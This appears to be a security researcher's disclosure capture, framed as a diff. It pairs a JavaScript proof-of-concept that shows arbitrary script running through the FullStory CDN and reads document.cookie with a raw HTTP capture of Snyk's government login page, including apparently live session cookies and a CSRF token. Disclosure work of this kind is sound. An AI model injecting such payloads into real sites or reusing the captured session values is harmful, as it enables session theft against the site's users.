@@ -1,1 +1,202 @@
-window['_fs_host'];(function(){var b=document.createElement('div');b.style='position:fixed;top:0;left:0;width:100%;padding:15px;background:red;color:white;font-size:20px;z-index:99999;text-align:center';b.textContent='POC: Arbitrary JS executed via FullStory CDN - Supply Chain Risk';document.addEventListener('DOMContentLoaded',function(){document.body.prepend(b);console.log('[POC] Cookies accessible to JS: '+document.cookie)})})()//
+GET /login?redirectUri=Lw&from=snyk_auth_link HTTP/2
+Host: app.snykgov.io
+Cookie: ajs_anonymous_id=5ba92389-a73f-4b3c-8726-167b0ddaea62; _csrf=PijF3Hnr3-CYvwVu5erNd9j3; ignoreReferrer=true; AMP_af27ef9dda=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjI2ZTgxNDdmMC1kZWI3LTRlMTgtODYyYS03MGVhMDNiZTAxOTYlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzc2Mjg4NzU2NzAwJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJwYWdlQ291bnRlciUyMiUzQTAlN0Q=; snyk.publicId=9ce10aaa-1c14-4895-ac3a-51f1bc301f05; snyk.id=s%3A871ZO8U34pJMT4bUqRjOPq-3rXN9q1SF.pzVXXQCsja6Y9Wp1EEUzbwtdpkpAmgpon5wPR%2BmN2dU
+Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Referer: https://app.snykgov.io/
+
+
+
+
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+Date: Wed, 15 Apr 2026 21:45:40 GMT
+Server: istio-envoy
+X-Envoy-Decorator-Operation: registry-web.default.svc.cluster.local:30101/*
+Content-Security-Policy: base-uri https://app.snykgov.io; script-src 'self' 'nonce-CObjOC7BjcEhq5u0qD+NuQ==' 'unsafe-inline' 'unsafe-eval' 'strict-dynamic' 'report-sample'; img-src https: data:; object-src 'none'; frame-ancestors https://app.snykgov.io https://learn.snyk.io https://login.snyk.io https://security.snyk.io; report-to csp-report-group; report-uri https://web-reports.snyk.io/csp?version=4d34becb5d6d9a8c5d0c5ebe2674bd35287c0b85;
+Report-To: {"group":"csp-report-group","max_age":1800,"endpoints":[{"url":"https://web-reports.snyk.io/csp?version=4d34becb5d6d9a8c5d0c5ebe2674bd35287c0b85"}],"include_subdomains":true}
+Snyk-Request-Id: 3abb4d01-a8f9-4b04-9d3e-a4dd8250c77b
+Referrer-Policy: strict-origin-when-cross-origin
+Cache-Control: no-cache, no-store, must-revalidate
+Vary: Accept-Encoding
+X-Envoy-Upstream-Service-Time: 7
+X-Cache: Miss from cloudfront
+Via: 1.1 a3951d8f67c74b7a8683213cf4008ee6.cloudfront.net (CloudFront)
+X-Amz-Cf-Pop: CMH68-P7
+X-Amz-Cf-Id: sfPjmaOlIOrlPAQG0jE7uw9XMQU3PRqashf2UwmtUasYiZnT8b-e4Q==
+X-Xss-Protection: 1; mode=block
+X-Frame-Options: SAMEORIGIN
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <link rel="preload" href="https://static.snyk.io/prod/static-assets/style/build/fonts/roboto-regular.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="https://static.snyk.io/prod/static-assets/style/build/fonts/roboto-medium.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="https://static.snyk.io/prod/static-assets/style/build/fonts/roboto-bold.woff2" as="font" type="font/woff2" crossorigin>
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8">
+    <meta http-equiv="Content-Language" content="en-us">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in or sign up to secure your projects | Snyk</title>
+    
+    <meta data-snyk-vue="pageDesc" name="description" content="Log in to Snyk">
+    <link rel="icon" type="image/png" href="https://res.cloudinary.com/snyk/image/upload/v1468845142/favicon/favicon.png" sizes="194x194">
+    <link rel="icon" type="image/png" href="https://res.cloudinary.com/snyk/image/upload/v1468845142/favicon/android-chrome.png" sizes="192x192">
+    <link rel="apple-touch-icon" href="https://res.cloudinary.com/snyk/image/upload/v1468845142/favicon/apple-touch-icon.png" sizes="180x180">
+    <link rel="shortcut icon" href="https://res.cloudinary.com/snyk/image/upload/v1468845142/favicon/favicon.ico">
+    <link rel="mask-icon" href="https://res.cloudinary.com/snyk/image/upload/v1468845142/favicon/safari-pinned-tab.svg">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="msapplication-TileImage" content="https://res.cloudinary.com/snyk/image/upload/v1468845142/favicon/mstile.png">
+    <meta name="theme-color" content="hsl(259, 69%, 37%)">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:image" property="og:image" content="https://res.cloudinary.com/snyk/image/upload/v1468845142/logo/snyk-avatar.png">
+    <meta property="og:image:secure_url" content="https://res.cloudinary.com/snyk/image/upload/v1468845142/logo/snyk-avatar.png">
+    <meta property="og:image:width" content="600">
+    <meta property="og:image:height" content="600">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:locale" content="en_US">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Snyk">
+    <meta name="twitter:site" content="@snyksec">
+    <meta data-snyk-vue="pageTitle" name="twitter:title" property="og:title" content="Snyk - Log in or sign up to secure your projects">
+    <meta data-snyk-vue="pageDesc" name="twitter:description" property="og:description" content="Log in to Snyk">
+    <link rel="stylesheet" href="https://static.snyk.io/prod/static-assets/style/build/styles/app.min.04aab313fe26f064f512cec10bf17c29.md5.css">
+      <link rel="stylesheet" href="https://static.snyk.io/prod/static-assets/js/build/frontend/frontend.1988ba3e12fb286a1533637486198d67.md5.css">
+
+
+    <script nonce="CObjOC7BjcEhq5u0qD+NuQ==" type="text/javascript">
+        window.$embedded = JSON.parse(decodeURIComponent("%7B%22registration%22%3A%7B%7D%2C%22login%22%3A%7B%7D%2C%22showUpgradeButton%22%3Afalse%2C%22showBillingSettings%22%3Afalse%2C%22showPlans%22%3Afalse%2C%22disableAPIKeys%22%3Atrue%2C%22showAuthorizedApplicationSettings%22%3Afalse%2C%22showFedRampLoginMessage%22%3Atrue%2C%22disableNonFedRampCompliantEmails%22%3Atrue%2C%22headway%22%3A%7B%22enabled%22%3Afalse%7D%2C%22amplitudeExperiment%22%3Afalse%2C%22loginOptionsVisibility%22%3A%7B%22showAuth0GithubLogin%22%3Afalse%2C%22showAuth0BitbucketLogin%22%3Afalse%2C%22showAuth0GoogleLogin%22%3Afalse%2C%22showDockerLogin%22%3Afalse%2C%22showActiveDirectoryLogin%22%3Afalse%2C%22showSamlLogin%22%3Afalse%2C%22showGithubLogin%22%3Afalse%2C%22showSSOLogin%22%3Afalse%2C%22showAuth0WaadLogin%22%3Afalse%2C%22showSSOLink%22%3Atrue%7D%2C%22csrfToken%22%3A%22l5H2bUHn-I1KfImEo_nAOIKW9ooak49GZBW8%22%2C%22analyticsSecret%22%3Afalse%2C%22debugAnalytics%22%3Afalse%2C%22hideChrome%22%3Afalse%2C%22hideGroupNav%22%3Afalse%2C%22routerBase%22%3Anull%2C%22publicVulnDbUrl%22%3A%22https%3A%2F%2Fsecurity.snyk.io%22%2C%22showExternalLinkWarning%22%3Atrue%2C%22inviteOnlySocialUsers%22%3Afalse%2C%22availableRegions%22%3A%7B%7D%2C%22rememberLoginDetailsDefaultChecked%22%3Atrue%2C%22useVueRouter%22%3Atrue%2C%22endpoints%22%3A%7B%22dataProducts%22%3A%22%2Freporting%2F%22%7D%7D"));
+    </script>
+    <script nonce="CObjOC7BjcEhq5u0qD+NuQ==" text="text/javascript">
+      window.intercomSettings = {
+        hide_default_launcher: false || window.$embedded.hideChrome
+      }
+    </script>
+    <script nonce="CObjOC7BjcEhq5u0qD+NuQ==">
+      window['_fs_csp'] = true;
+      window['_fs_debug'] = false;
+      window['_fs_host'] = 'fullstory.com';
+      window['_fs_script'] = 'edge.fullstory.com/s/fs.js';
+      window['_fs_org'] = 'RX2JA';
+      window['_fs_namespace'] = 'FS';
+      (function(m,n,e,t,l,o,g,y){
+          if (e in m) {if(m.console && m.console.log) { m.console.log('FullStory namespace conflict. Please set window["_fs_namespace"].');} return;}
+          g=m[e]=function(a,b,s){g.q?g.q.push([a,b,s]):g._api(a,b,s);};g.q=[];
+          o=n.createElement(t);o.async=1;o.crossOrigin='anonymous';o.src='https://'+_fs_script;o.nonce="CObjOC7BjcEhq5u0qD+NuQ==";
+          y=n.getElementsByTagName(t)[0];y.parentNode.insertBefore(o,y);
+          g.identify=function(i,v,s){g(l,{uid:i},s);if(v)g(l,v,s)};g.setUserVars=function(v,s){g(l,v,s)};g.event=function(i,v,s){g('event',{n:i,p:v},s)};
+          g.shutdown=function(){g("rec",!1)};g.restart=function(){g("rec",!0)};
+          g.log = function(a,b){g("log",[a,b])};
+          g.consent=function(a){g("consent",!arguments.length||a)};
+          g.identifyAccount=function(i,v){o='account';v=v||{};v.acctId=i;g(o,v)};
+          g.clearUserCookie=function(){};
+          g._w={};y='XMLHttpRequest';g._w[y]=m[y];y='fetch';g._w[y]=m[y];
+          if(m[y])m[y]=function(){return g._w[y].apply(this,arguments)};
+      })(window,document,window['_fs_namespace'],'script','user');
+
+    </script>
+
+    <style>
+      .impersonate-partner {
+        border: 2px solid red;
+      }
+    </style>
+  </head>
+
+  <body   >
+    <div data-snyk-main class="l-main ">
+
+
+
+
+    <div class="legacy-main backdrop-neutral l-body">
+
+      <script nonce="CObjOC7BjcEhq5u0qD+NuQ==">
+        if(/MSIE \d|Trident.*rv:/.test(navigator.userAgent)) {
+          document.write('<div style="background-color:#fbf2e7;border-top:1px solid #e9af6d;border-bottom:1px solid #e9af6d;color:#a55c09;padding:12px 20px">' +
+            'Snyk no longer supports Internet Explorer, please use another browser. ' +
+            '<a href="https://support.snyk.io/hc/en-us/articles/360006120358-End-of-IE11-support-for-Snyk">'+
+              'Read our end of support announcement' +
+            '</a>.' +
+          '</div>');
+        }
+      </script>
+
+      <div class="scoped">
+        <div data-vue="global-announcements"></div>
+      </div>
+
+
+      <div id="messaging-alerts">
+      </div>
+
+
+      <div class="scoped">
+  <div data-vue="app">
+    <router-view></router-view>
+  </div>
+</div>
+
+    </div>
+
+    <style nonce="CObjOC7BjcEhq5u0qD+NuQ==">
+      .nav--footer .list-social__link {
+        color: #c3c2cb;
+      }
+    </style>
+
+
+
+    <div class="fullpage-spinner">
+      <div class="fullpage-spinner__spinner">
+        <div class="spinner"></div>
+      </div>
+    </div>
+
+    </div>
+
+    <!-- #slidepanel-content -->
+
+    <script nonce="CObjOC7BjcEhq5u0qD+NuQ==">
+      // Adds class of js to the html tag if JS is enabled
+      document.getElementsByTagName('html')[0].className += ' js';
+    </script>
+
+    <script nonce="CObjOC7BjcEhq5u0qD+NuQ==" src="https://js.sentry-cdn.com/db2c7b7ca7654a14b47912ee3ef4a2c5.min.js" crossorigin="anonymous"></script>
+    <script nonce="CObjOC7BjcEhq5u0qD+NuQ==">
+      Sentry.init({
+        environment: 'prod',
+        release: '4d34becb5d6d9a8c5d0c5ebe2674bd35287c0b85',
+        allowUrls: [
+          /https?:\/\/((app|static)\.)?([a-z]+\.)?snyk\.io/,
+          'localhost'
+        ],
+        ignoreErrors: [
+          'ResizeObserver loop limit exceeded',
+          'Boomerang is not defined',
+          'can\'t redefine non-configurable property "availWidth"',
+          'Identifier \'originalPrompt\' has already been declared',
+          'Non-Error promise rejection captured with value: Object Not Found Matching Id'
+        ]
+      });
+    </script>
+
+  <script nonce="CObjOC7BjcEhq5u0qD+NuQ==" async src="https://static.snyk.io/prod/static-assets/js/build/app.min.c2971a5e724cb80f0e041b99105241ba.md5.js"></script>
+    <script nonce="CObjOC7BjcEhq5u0qD+NuQ==" async data-snyk-test="Vue frontend/app" src="https://static.snyk.io/prod/static-assets/js/build/frontend/app.b0bb08303683adc5903f382b35f2ee13.md5.js"></script>
+
+  </body>
+</html>
